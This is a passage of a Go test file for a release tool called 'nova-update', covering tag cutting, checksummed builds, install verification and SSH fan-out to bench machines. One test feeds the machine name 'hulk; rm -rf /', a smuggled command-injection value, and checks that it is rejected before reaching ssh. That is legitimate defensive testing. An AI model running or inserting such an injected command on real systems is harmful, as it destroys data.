package release

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// The fakes. Every edge this package has to the world outside the process is an
// interface, and these three are the whole of what a unit test here talks to:
// no gh, no ssh, no compiler, no network.
// ---------------------------------------------------------------------------

type fakeForge struct {
	head     map[string]string
	checks   map[string][]CheckRun
	tags     []string
	commits  map[string][]Commit
	tagged   []string
	failTag  error
	failHead error
}

func (f *fakeForge) HeadSHA(_ context.Context, _, branch string) (string, error) {
	if f.failHead != nil {
		return "", f.failHead
	}
	sha, ok := f.head[branch]
	if !ok {
		return "", fmt.Errorf("no such branch %s", branch)
	}
	return sha, nil
}
func (f *fakeForge) CheckRuns(_ context.Context, _, sha string) ([]CheckRun, error) {
	return f.checks[sha], nil
}
func (f *fakeForge) Tags(_ context.Context, _ string) ([]string, error) { return f.tags, nil }
func (f *fakeForge) Compare(_ context.Context, _, base, head string) ([]Commit, error) {
	return f.commits[base+"..."+head], nil
}
func (f *fakeForge) Tag(_ context.Context, _, tag, sha string) error {
	if f.failTag != nil {
		return f.failTag
	}
	f.tagged = append(f.tagged, tag+" "+sha)
	return nil
}

type fakeToolchain struct {
	calls []string
	fail  string // package whose build fails
}

func (b *fakeToolchain) Build(_ context.Context, source, pkg, out, goos, goarch string, args []string) (string, error) {
	b.calls = append(b.calls, fmt.Sprintf("%s %s %s %s/%s %s", source, pkg, out, goos, goarch, strings.Join(args, " ")))
	if b.fail != "" && strings.HasSuffix(pkg, b.fail) {
		return "undefined: nope", fmt.Errorf("exit status 2")
	}
	if err := os.MkdirAll(filepath.Dir(out), 0o755); err != nil {
		return "", err
	}
	// A stub that is a real file with real bytes, so the checksum file the
	// caller writes is over something.
	return "", os.WriteFile(out, []byte("binary "+filepath.Base(out)+" "+strings.Join(args, " ")), 0o755)
}

type fakeSSH struct {
	runs    []string
	sends   []string
	fetches []string
	// answer is keyed by machine; a machine absent from it refuses.
	answer map[string]string
	refuse map[string]error
	// serves is the local directory a machine hands back from a Fetch,
	// standing in for `ssh host tar -cf -`.
	serves map[string]string
}

func (s *fakeSSH) Run(_ context.Context, machine string, argv []string) (string, error) {
	s.runs = append(s.runs, machine+": "+strings.Join(argv, " "))
	if err := s.refuse[machine]; err != nil {
		return "", err
	}
	return s.answer[machine], nil
}
func (s *fakeSSH) Send(_ context.Context, machine, dir, dest string) (string, error) {
	s.sends = append(s.sends, machine+": "+dir+" -> "+dest)
	if err := s.refuse[machine]; err != nil {
		return "", err
	}
	return "", nil
}

// Fetch stands in for `ssh host tar -cf - .` by copying the local directory the
// test registered in serves, so a `--from host:dir` run exercises the staging,
// the verification and the fan-out with no network and no tar binary.
func (s *fakeSSH) Fetch(_ context.Context, machine, dir, dest string) (string, error) {
	s.fetches = append(s.fetches, machine+": "+dir+" -> "+dest)
	if err := s.refuse[machine]; err != nil {
		return "", err
	}
	source, ok := s.serves[machine]
	if !ok {
		return "", fmt.Errorf("tar: %s: Cannot open: No such file or directory", dir)
	}
	if err := os.MkdirAll(dest, 0o755); err != nil {
		return "", err
	}
	entries, err := os.ReadDir(source)
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		body, err := os.ReadFile(filepath.Join(source, e.Name()))
		if err != nil {
			return "", err
		}
		if err := os.WriteFile(filepath.Join(dest, e.Name()), body, 0o755); err != nil {
			return "", err
		}
	}
	return "", nil
}

func at(t *testing.T) time.Time {
	t.Helper()
	when, err := time.Parse(time.RFC3339, "2026-09-18T09:00:00Z")
	if err != nil {
		t.Fatal(err)
	}
	return when
}

func greenRuns() []CheckRun {
	return []CheckRun{
		{Name: "ci", Status: "completed", Conclusion: "success"},
		{Name: "certification", Status: "completed", Conclusion: "success"},
		{Name: "lint", Status: "completed", Conclusion: "skipped"},
	}
}

func cutDeps(t *testing.T, f Forge) Deps {
	t.Helper()
	return Deps{Forge: f, Now: func() time.Time { return at(t) }}
}

// ---------------------------------------------------------------------------
// cut
// ---------------------------------------------------------------------------

// A tag is a claim about source, and the one thing a release must never do is
// make that claim about a commit nobody vouched for. release.yml has said so
// since v0.15.0; this is the same refusal one step earlier, where the person
// cutting the release is still at the keyboard.
func TestCutRefusesAShaWhoseChecksAreNotGreen(t *testing.T) {
	for _, tc := range []struct {
		name  string
		runs  []CheckRun
		wants string
	}{
		{"a failure", []CheckRun{{Name: "ci", Status: "completed", Conclusion: "failure"}}, "ci"},
		{"still running", []CheckRun{{Name: "ci", Status: "in_progress"}}, "ci"},
		{"nothing at all", nil, "no check"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := &fakeForge{
				head:   map[string]string{"main": "abc123abc123"},
				checks: map[string][]CheckRun{"abc123abc123": tc.runs},
			}
			var out, errs bytes.Buffer
			code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main",
				"--version", "v0.16.0", "--changelog", filepath.Join(t.TempDir(), "CHANGELOG.md")},
				&out, &errs, cutDeps(t, f))
			if code != 2 {
				t.Fatalf("green-gate did not refuse: code=%d out=%s errs=%s", code, out.String(), errs.String())
			}
			if !strings.Contains(errs.String(), "CUT REFUSED") || !strings.Contains(errs.String(), tc.wants) {
				t.Fatalf("refusal does not name the evidence: %s", errs.String())
			}
			if len(f.tagged) != 0 {
				t.Fatalf("a red sha was tagged: %v", f.tagged)
			}
		})
	}
}

func cutForge() *fakeForge {
	return &fakeForge{
		head:   map[string]string{"main": "abc123abc123def"},
		checks: map[string][]CheckRun{"abc123abc123def": greenRuns()},
		tags:   []string{"v0.15.3", "v0.9.0", "v0.15.10", "not-a-version"},
		commits: map[string][]Commit{
			"v0.15.10...abc123abc123def": {
				{SHA: "111", Message: "feat: nova-pulse hygiene, the path-safe bench cleanup verbs (#1142) (#1253)\n\nbody"},
				{SHA: "222", Message: "integration-2: 5 pre-tested PRs (deterministic idle watch) (#1312)\n\nMembers:\n- #1301 idle watch\n- #1305 sandbox parent guard\n"},
				{SHA: "333", Message: "a commit with no pull request number"},
			},
		},
	}
}

func TestCutWritesTheChangelogTagsAndSaysWhatItDid(t *testing.T) {
	f := cutForge()
	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
	if err := os.WriteFile(path, []byte("# nova-tools changelog\n\n## v0.15.10 — 2026-09-17\n\n- #1 older\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"cut", "--repo", "mas-bandwidth/nova-tools", "--from", "main",
		"--version", "v0.16.0", "--changelog", path}, &out, &errs, cutDeps(t, f))
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, errs.String())
	}
	// The one line a person reads off the terminal.
	want := "RELEASE CUT version=v0.16.0 sha=abc123abc123def prs=2"
	if !strings.Contains(out.String(), want) {
		t.Fatalf("no cut line %q in:\n%s", want, out.String())
	}
	if len(f.tagged) != 1 || f.tagged[0] != "v0.16.0 abc123abc123def" {
		t.Fatalf("tagged %v", f.tagged)
	}
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	got := string(body)
	// The previous tag is the HIGHEST version tag, not the first one listed:
	// v0.15.10 is after v0.15.3, which a lexical sort gets backwards.
	for _, s := range []string{
		"## v0.16.0 — 2026-09-18",
		"since v0.15.10",
		"#1253",
		"feat: nova-pulse hygiene, the path-safe bench cleanup verbs (#1142)",
		"#1312",
		"integration-2: 5 pre-tested PRs (deterministic idle watch)",
		"#1301",
		"#1305",
	} {
		if !strings.Contains(got, s) {
			t.Errorf("the new section does not carry %q:\n%s", s, got)
		}
	}
	// Prepended, never overwritten: the old section is still there and the new
	// one is above it.
	if !strings.Contains(got, "## v0.15.10 — 2026-09-17") {
		t.Fatalf("the previous section was lost:\n%s", got)
	}
	if strings.Index(got, "## v0.16.0") > strings.Index(got, "## v0.15.10") {
		t.Fatalf("the new section is below the old one:\n%s", got)
	}
	if !strings.HasPrefix(got, "# nova-tools changelog\n") {
		t.Fatalf("the file's title was displaced:\n%s", got)
	}
}

// A commit whose subject carries no (#n) is not a pull request and is not a
// changelog line; the count says 2 because two of the three commits were.
func TestCutCountsOnlyCommitsThatNameAPullRequest(t *testing.T) {
	prs := PullRequests(cutForge().commits["v0.15.10...abc123abc123def"])
	if len(prs) != 2 {
		t.Fatalf("prs=%d %v", len(prs), prs)
	}
	sort.Slice(prs, func(i, j int) bool { return prs[i].Number < prs[j].Number })
	if prs[0].Number != 1253 || prs[0].Title != "feat: nova-pulse hygiene, the path-safe bench cleanup verbs (#1142)" {
		t.Fatalf("first pr %+v", prs[0])
	}
	// The batch's members come out of its own body, so a batch line does not
	// hide five pieces of work behind one number.
	if got := fmt.Sprint(prs[1].Members); got != "[1301 1305]" {
		t.Fatalf("members %s", got)
	}
}

func TestCutDryRunWritesNothingAndTagsNothing(t *testing.T) {
	f := cutForge()
	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main", "--version", "v0.16.0",
		"--changelog", path, "--dry-run"}, &out, &errs, cutDeps(t, f))
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, errs.String())
	}
	if !strings.Contains(out.String(), "RELEASE CUT version=v0.16.0") || !strings.Contains(out.String(), "dry-run=yes") {
		t.Fatalf("dry run says nothing about itself: %s", out.String())
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("--dry-run wrote %s", path)
	}
	if len(f.tagged) != 0 {
		t.Fatalf("--dry-run tagged %v", f.tagged)
	}
}

func TestCutRefusesAVersionNoLaterStepCouldCheck(t *testing.T) {
	for _, v := range []string{"", "0.16.0", "v0.16", "v0.16.0 rc1", "v0.16.0%s", "v0.16=0"} {
		if err := ValidVersion(v); err == nil {
			t.Errorf("accepted %q", v)
		}
	}
	for _, v := range []string{"v0.16.0", "v1.0.0-rc1", "v0.15.3-0.20260918044559-d576bf6bbabb"} {
		if err := ValidVersion(v); err != nil {
			t.Errorf("refused %q: %v", v, err)
		}
	}
}

func TestEveryReleaseVerbNamesItsMissingFlagsAtOnce(t *testing.T) {
	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"cut"}, &out, &errs, Deps{})
	if code != 2 {
		t.Fatal(code)
	}
	for _, flag := range []string{"--repo", "--from", "--version", "--changelog"} {
		if !strings.Contains(errs.String(), flag) {
			t.Fatalf("missing %s: %s", flag, errs.String())
		}
	}
	if strings.Count(errs.String(), "\n") > 1 {
		t.Fatalf("the refusal printed a banner: %s", errs.String())
	}
}

// ---------------------------------------------------------------------------
// build
// ---------------------------------------------------------------------------

func sourceTree(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for _, tool := range []string{"nova-update", "nova-bus", "nova-swarm"} {
		if err := os.MkdirAll(filepath.Join(dir, "cmd", tool), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "cmd", tool, "main.go"), []byte("package main\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// Not a nova tool: the build loop ships cmd/nova-*, so this must not appear.
	if err := os.MkdirAll(filepath.Join(dir, "cmd", "helper"), 0o755); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestBuildStampsEveryToolAndWritesOneChecksumFile(t *testing.T) {
	source, out := sourceTree(t), t.TempDir()
	tc := &fakeToolchain{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", out, "--source", source},
		&o, &e, Deps{Toolchain: tc})
	if code != 0 {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
	if len(tc.calls) != 3 {
		t.Fatalf("built %d packages: %v", len(tc.calls), tc.calls)
	}
	for _, call := range tc.calls {
		if !strings.Contains(call, "-trimpath") {
			t.Fatalf("no -trimpath: %s", call)
		}
		// The stamp is what makes `nova-X version` answer the release rather
		// than `devel`; an empty -X is a legal linker flag and was #118.
		if !strings.Contains(call, "-ldflags -s -w -X main.version=v0.16.0") {
			t.Fatalf("no version stamp: %s", call)
		}
		if !strings.Contains(call, "cmd/nova-") {
			t.Fatalf("built something that is not a nova tool: %s", call)
		}
	}
	plat := runtime.GOOS + "-" + runtime.GOARCH
	dir := filepath.Join(out, "v0.16.0", plat)
	sums, err := os.ReadFile(filepath.Join(dir, "SHA256SUMS"))
	if err != nil {
		t.Fatal(err)
	}
	if n := strings.Count(strings.TrimSpace(string(sums)), "\n") + 1; n != 3 {
		t.Fatalf("SHA256SUMS has %d lines:\n%s", n, sums)
	}
	// The checksum file cannot list itself, and every line is over a file that
	// is really there with really that hash.
	if strings.Contains(string(sums), "SHA256SUMS") {
		t.Fatalf("SHA256SUMS lists itself:\n%s", sums)
	}
	for _, line := range strings.Split(strings.TrimSpace(string(sums)), "\n") {
		want, name, ok := strings.Cut(line, "  ")
		if !ok {
			t.Fatalf("not a sha256sum line: %q", line)
		}
		body, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		sum := sha256.Sum256(body)
		if got := hex.EncodeToString(sum[:]); got != want {
			t.Fatalf("%s: %s recorded, %s on disk", name, want, got)
		}
	}
	if !strings.Contains(o.String(), "RELEASE BUILT version=v0.16.0") || !strings.Contains(o.String(), "tools=3") {
		t.Fatalf("no build line: %s", o.String())
	}
}

func TestBuildRefusesWhenOneToolDoesNotCompile(t *testing.T) {
	source, out := sourceTree(t), t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", out, "--source", source},
		&o, &e, Deps{Toolchain: &fakeToolchain{fail: "nova-swarm"}})
	if code != 1 {
		t.Fatalf("code=%d", code)
	}
	if !strings.Contains(e.String(), "nova-swarm") {
		t.Fatalf("the failure does not name the tool: %s", e.String())
	}
	// A half-built directory must not carry a checksum file: SHA256SUMS over
	// two of three tools is a file that agrees with itself and with nothing.
	if _, err := os.Stat(filepath.Join(out, "v0.16.0", runtime.GOOS+"-"+runtime.GOARCH, "SHA256SUMS")); err == nil {
		t.Fatal("a failed build still wrote SHA256SUMS")
	}
}

func TestBuildRefusesASourceTreeWithNoNovaTools(t *testing.T) {
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", t.TempDir(), "--source", t.TempDir()},
		&o, &e, Deps{Toolchain: &fakeToolchain{}})
	if code != 2 || !strings.Contains(e.String(), "no cmd/nova-") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
}

// ---------------------------------------------------------------------------
// install
// ---------------------------------------------------------------------------

// hostPlatform is what an empty --platform resolves to. A test that wants a
// SPECIFIC platform passes one; a test that does not care passes "" and gets
// this. No test here assembles a tool's FILE NAME out of runtime.GOOS itself:
// doing that is how the Windows leg failed, with the artifacts written as
// nova-wake.exe and every assertion asking after nova-wake.
var hostPlatform = runtime.GOOS + "-" + runtime.GOARCH

// assertRunnable is what "this tool was installed and can be run" means, on
// each of the two kinds of filesystem this suite runs on.
//
// THE HOST DECIDES THIS, NOT THE TARGET -- and that is the distinction the
// sharded Windows leg found. Everything else about a platform in these tests is
// the TARGET's (a windows release is called nova-bus.exe whoever builds it), but
// a file's mode is a property of the filesystem the bytes actually landed on. On
// a windows runner BOTH the windows-amd64 case and the linux-amd64 one report
// `-rw-rw-rw-`, because NTFS has no execute bit for Go to report: os.Chmod there
// moves one read-only attribute and nothing else. An assertion on 0o111 is not
// false on windows, it is meaningless -- it cannot fail for a real defect and it
// cannot pass for a real guarantee, which is the same trap #1262 fell into.
//
// So what is asserted is what the install actually promises and what each
// filesystem can actually answer: the file is there, under the target's name,
// it is a regular file, and it carries the artifact's bytes rather than an empty
// placeholder. On unix the execute bit is asserted on top, because there it is
// the difference between an installed tool and one nobody can run.
func assertRunnable(t *testing.T, path string) {
	t.Helper()
	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("%s was not installed: %v", filepath.Base(path), err)
	}
	if !info.Mode().IsRegular() {
		t.Fatalf("%s is not a regular file: %v", filepath.Base(path), info.Mode())
	}
	// The fixture toolchain writes "binary <name> <build args>", so this also
	// says the bytes are the ARTIFACT's and not a leftover or an empty file --
	// a check every platform can make, and a stronger one than the mode bit.
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("%s cannot be read back: %v", filepath.Base(path), err)
	}
	if !strings.HasPrefix(string(body), "binary "+filepath.Base(path)+" ") {
		t.Fatalf("%s does not hold the built artifact's bytes: %q", filepath.Base(path), body)
	}
	if runtime.GOOS == "windows" {
		return // no execute bit exists here; the checks above are the whole answer
	}
	if info.Mode().Perm()&0o111 == 0 {
		t.Fatalf("%s is not executable: %v", filepath.Base(path), info.Mode())
	}
}

func platformOf(t *testing.T, flagValue string) (string, string) {
	t.Helper()
	goos, goarch, err := Platform(flagValue)
	if err != nil {
		t.Fatal(err)
	}
	return goos, goarch
}

// built lays down what `build` writes for one platform, so the install and
// adopt tests start from the artifact rather than from a hand-made directory
// that might not match it -- including its file NAMES, which is the whole of
// what went wrong. platform "" means this host.
func built(t *testing.T, version, platform string, tools ...string) string {
	t.Helper()
	out := t.TempDir()
	source := t.TempDir()
	for _, tool := range tools {
		if err := os.MkdirAll(filepath.Join(source, "cmd", tool), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(source, "cmd", tool, "main.go"), []byte("package main\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	args := []string{"build", "--version", version, "--out", out, "--source", source}
	if platform != "" {
		args = append(args, "--platform", platform)
	}
	var o, e bytes.Buffer
	if code := Run("nova-update", args, &o, &e, Deps{Toolchain: &fakeToolchain{}}); code != 0 {
		t.Fatalf("fixture build: %d %s", code, e.String())
	}
	return out
}

// The build names every artifact for the TARGET, so a windows release is a
// directory of .exe files whatever host built it -- which is what lets the
// install below find them and the adopt below run one of them.
func TestBuildNamesArtifactsForTheTargetNotTheHost(t *testing.T) {
	for _, tc := range []struct{ platform, want string }{
		{"windows-amd64", "nova-bus.exe"},
		{"linux-amd64", "nova-bus"},
		{"darwin-arm64", "nova-bus"},
	} {
		t.Run(tc.platform, func(t *testing.T) {
			goos, goarch := platformOf(t, tc.platform)
			dir := ArtifactDir(built(t, "v0.16.0", tc.platform, "nova-bus"), "v0.16.0", goos, goarch)
			arts, err := ReadSums(dir)
			if err != nil {
				t.Fatal(err)
			}
			if len(arts) != 1 || arts[0].Name != tc.want {
				t.Fatalf("%s built %v, want %s", tc.platform, arts, tc.want)
			}
			if _, err := os.Stat(filepath.Join(dir, tc.want)); err != nil {
				t.Fatalf("%s is not on disk: %v", tc.want, err)
			}
		})
	}
}

// The Windows PR leg of integration-4 failed here: on a windows host the build
// writes nova-wake.exe, this test pre-installed a bare nova-wake, and its probe
// matched a bare base name -- so nothing skipped and the count was wrong. The
// platform is now NAMED rather than inherited from whichever host runs the
// suite, and windows is one of the names, so this holds on every runner and
// also says what a windows release is supposed to look like.
func TestInstallVerifiesRenamesAndSkipsWhatIsAlreadyCurrent(t *testing.T) {
	for _, platform := range []string{"", "linux-amd64", "windows-amd64"} {
		name := platform
		if name == "" {
			name = "this host " + hostPlatform
		}
		t.Run(name, func(t *testing.T) {
			goos, _ := platformOf(t, platform)
			from := built(t, "v0.16.0", platform, "nova-bus", "nova-swarm", "nova-wake")
			bin := t.TempDir()
			// nova-wake is already at the release; the other two are not. It
			// is written under the name the TARGET installs it as.
			current := ToolFile("nova-wake", goos)
			if err := os.WriteFile(filepath.Join(bin, current), []byte("old"), 0o755); err != nil {
				t.Fatal(err)
			}
			args := []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin}
			if platform != "" {
				args = append(args, "--platform", platform)
			}
			var o, e bytes.Buffer
			var probed []string
			code := Run("nova-update", args, &o, &e, Deps{VersionOf: func(_ context.Context, p string) (string, error) {
				probed = append(probed, filepath.Base(p))
				if filepath.Base(p) == current {
					return "nova-wake v0.16.0 " + goos + "/amd64", nil
				}
				return "", fmt.Errorf("no such file")
			}})
			if code != 0 {
				t.Fatalf("code=%d errs=%s", code, e.String())
			}
			if want := "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=1"; !strings.Contains(o.String(), want) {
				t.Fatalf("no install line %q in:\n%s", want, o.String())
			}
			// THE PROBE ASKS THE REAL FILE. On windows that is nova-bus.exe,
			// and a probe that ran `nova-bus` would be asking after a path
			// that does not exist -- an error, which reads as "not current",
			// which reinstalls every tool on every pass forever.
			wantProbed := []string{ToolFile("nova-bus", goos), ToolFile("nova-swarm", goos), current}
			sort.Strings(probed)
			sort.Strings(wantProbed)
			if strings.Join(probed, ",") != strings.Join(wantProbed, ",") {
				t.Fatalf("probed %v, want %v", probed, wantProbed)
			}
			for _, tool := range []string{"nova-bus", "nova-swarm"} {
				assertRunnable(t, filepath.Join(bin, ToolFile(tool, goos)))
			}
			// Skipped means untouched, not overwritten with the same bytes.
			body, err := os.ReadFile(filepath.Join(bin, current))
			if err != nil || string(body) != "old" {
				t.Fatalf("a skipped tool was rewritten: %q %v", body, err)
			}
			// The temporary name never survives the verb.
			entries, err := os.ReadDir(bin)
			if err != nil {
				t.Fatal(err)
			}
			for _, entry := range entries {
				if strings.HasPrefix(entry.Name(), ".") {
					t.Fatalf("a temporary file was left behind: %s", entry.Name())
				}
			}
		})
	}
}

func TestInstallRefusesABinaryThatDoesNotMatchItsChecksum(t *testing.T) {
	goos, goarch := platformOf(t, "")
	from := built(t, "v0.16.0", "", "nova-bus", "nova-swarm")
	dir := ArtifactDir(from, "v0.16.0", goos, goarch)
	if err := os.WriteFile(filepath.Join(dir, ToolFile("nova-bus", goos)), []byte("tampered"), 0o755); err != nil {
		t.Fatal(err)
	}
	bin := t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin},
		&o, &e, Deps{VersionOf: func(context.Context, string) (string, error) { return "", fmt.Errorf("absent") }})
	if code != 2 {
		t.Fatalf("code=%d out=%s", code, o.String())
	}
	if !strings.Contains(e.String(), "nova-bus") || !strings.Contains(e.String(), "INSTALL REFUSED") {
		t.Fatalf("refusal: %s", e.String())
	}
	// NOTHING is installed when one file fails: the set is verified whole
	// before the first rename, so a bad artifact cannot land beside good ones.
	if entries, err := os.ReadDir(bin); err != nil || len(entries) != 0 {
		t.Fatalf("a refused install still wrote %v (%v)", entries, err)
	}
}

func TestInstallRefusesAVersionThatWasNeverBuilt(t *testing.T) {
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"install", "--from", built(t, "v0.16.0", "", "nova-bus"),
		"--version", "v0.17.0", "--bin", t.TempDir()}, &o, &e, Deps{})
	if code != 2 || !strings.Contains(e.String(), "v0.17.0") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
}

// ---------------------------------------------------------------------------
// adopt
// ---------------------------------------------------------------------------

func machinesFile(t *testing.T, lines string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "machines")
	if err := os.WriteFile(path, []byte(lines), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

// The remote command names the tool file of the TARGET, so adopting a windows
// bench runs nova-update.exe there. Composing a bare `nova-update` was the
// product half of the same defect the Windows PR leg found in the test half:
// the path would exist nowhere in the release, and the bench would answer
// `command not found` for a mistake made on this side.
func TestAdoptSendsInstallsAndWritesOneReceiptPerMachine(t *testing.T) {
	for _, platform := range []string{"", "linux-amd64", "windows-amd64"} {
		name := platform
		if name == "" {
			name = "this host " + hostPlatform
		}
		t.Run(name, func(t *testing.T) {
			goos, goarch := platformOf(t, platform)
			from := built(t, "v0.16.0", platform, "nova-bus", "nova-update")
			list := machinesFile(t, "# the Linux benches\nhulk\nvision\n\nmini\n")
			s := &fakeSSH{answer: map[string]string{
				"hulk":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n",
				"vision": "RELEASE INSTALLED version=v0.16.0 tools=0 skipped=2\n",
				"mini":   "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n",
			}}
			args := []string{"adopt", "--version", "v0.16.0", "--machines", list,
				"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/home/nova/.local/bin",
				"--dest", "/home/nova/nova-bench/build"}
			if platform != "" {
				args = append(args, "--platform", platform)
			}
			var o, e bytes.Buffer
			if code := Run("nova-update", args, &o, &e, Deps{SSH: s}); code != 0 {
				t.Fatalf("code=%d errs=%s", code, e.String())
			}
			for _, machine := range []string{"hulk", "vision", "mini"} {
				want := "RELEASE ADOPTED machine=" + machine + " version=v0.16.0 tools="
				if !strings.Contains(o.String(), want) {
					t.Fatalf("no receipt for %s:\n%s", machine, o.String())
				}
			}
			if !strings.Contains(o.String(), "RELEASE ADOPT OK machines=3 adopted=3 refused=0") {
				t.Fatalf("no verdict line:\n%s", o.String())
			}
			if len(s.sends) != 3 || len(s.runs) != 3 {
				t.Fatalf("sends=%v runs=%v", s.sends, s.runs)
			}
			// The release installs ITSELF: the nova-update that runs the
			// remote install is the one just sent, so a bench with no
			// nova-tools at all can still adopt. That is the whole of what
			// fleet-install-tools.sh's nested ssh quoting was doing.
			run := s.runs[0]
			for _, part := range []string{
				"/home/nova/nova-bench/build/v0.16.0/" + goos + "-" + goarch + "/" + ToolFile("nova-update", goos),
				"release install",
				"--version v0.16.0",
				"--bin /home/nova/.local/bin",
				"--platform " + goos + "-" + goarch,
			} {
				if !strings.Contains(run, part) {
					t.Fatalf("the remote command does not carry %q: %s", part, run)
				}
			}
			// Remote paths are slash paths whatever this host is, so a
			// darwin or windows coordinator adopts a Linux bench correctly.
			if strings.Contains(run, `\`) {
				t.Fatalf("the remote command carries a backslash path: %s", run)
			}
		})
	}
}

// A windows release that somehow carries no nova-update.exe is refused by name,
// rather than sent and then found missing on the far side.
func TestAdoptRefusesAReleaseWithNoUpdateForTheTarget(t *testing.T) {
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk\n"), "--ssh", "/usr/bin/ssh",
		"--from", built(t, "v0.16.0", "windows-amd64", "nova-bus"), "--bin", "/b", "--dest", "/d",
		"--platform", "windows-amd64"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "nova-update.exe") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
}

func TestAdoptRefusesOneMachineAndStillReportsTheRest(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-bus", "nova-update")
	list := machinesFile(t, "hulk\nvision\n")
	s := &fakeSSH{
		answer: map[string]string{"hulk": "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=0\n"},
		refuse: map[string]error{"vision": fmt.Errorf("ssh: connect to host vision port 22: Connection refused")},
	}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0", "--machines", list,
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/home/nova/.local/bin",
		"--dest", "/home/nova/nova-bench/build"}, &o, &e, Deps{SSH: s})
	if code != 1 {
		t.Fatalf("code=%d", code)
	}
	if !strings.Contains(o.String(), "RELEASE ADOPTED machine=hulk") {
		t.Fatalf("the machine that worked has no receipt:\n%s", o.String())
	}
	line := ""
	for _, l := range strings.Split(e.String(), "\n") {
		if strings.HasPrefix(l, "RELEASE REFUSED machine=vision") {
			line = l
		}
	}
	if line == "" {
		t.Fatalf("no refusal for vision:\n%s", e.String())
	}
	// A refusal with no remedy is a line that tells somebody to go and find out.
	if !strings.Contains(line, "Connection refused") || !strings.Contains(line, "ssh ") {
		t.Fatalf("the refusal carries no cause and remedy: %s", line)
	}
	if !strings.Contains(e.String(), "adopted=1 refused=1") {
		t.Fatalf("the verdict does not count both:\n%s", e.String())
	}
}

// A remote that answered something other than the install line is not an
// adoption, however cheerfully it exited: the receipt is read from the output,
// never from the exit code.
func TestAdoptRefusesAMachineWhoseInstallSaidNothing(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-update")
	s := &fakeSSH{answer: map[string]string{"hulk": "bash: nova-update: command not found\n"}}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0", "--machines", machinesFile(t, "hulk\n"),
		"--ssh", "/usr/bin/ssh", "--from", from, "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: s})
	if code != 1 || !strings.Contains(e.String(), "RELEASE REFUSED machine=hulk") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
}

func TestAdoptRefusesAMachineNameThatIsNotOne(t *testing.T) {
	from := built(t, "v0.16.0", "", "nova-update")
	s := &fakeSSH{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "hulk; rm -rf /\n"), "--ssh", "/usr/bin/ssh",
		"--from", from, "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: s})
	if code != 2 {
		t.Fatalf("code=%d out=%s", code, o.String())
	}
	if len(s.runs) != 0 || len(s.sends) != 0 {
		t.Fatalf("a bad machine name still reached ssh: %v %v", s.runs, s.sends)
	}
}

func TestAdoptRefusesAnEmptyMachineList(t *testing.T) {
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"adopt", "--version", "v0.16.0",
		"--machines", machinesFile(t, "# nobody\n\n"), "--ssh", "/usr/bin/ssh",
		"--from", built(t, "v0.16.0", "", "nova-update"), "--bin", "/b", "--dest", "/d"}, &o, &e, Deps{SSH: &fakeSSH{}})
	if code != 2 || !strings.Contains(e.String(), "no machine") {
		t.Fatalf("code=%d errs=%s", code, e.String())
	}
}

// ---------------------------------------------------------------------------
// the forge edge
// ---------------------------------------------------------------------------

// The first real `cut --dry-run` against this repository asked the compare
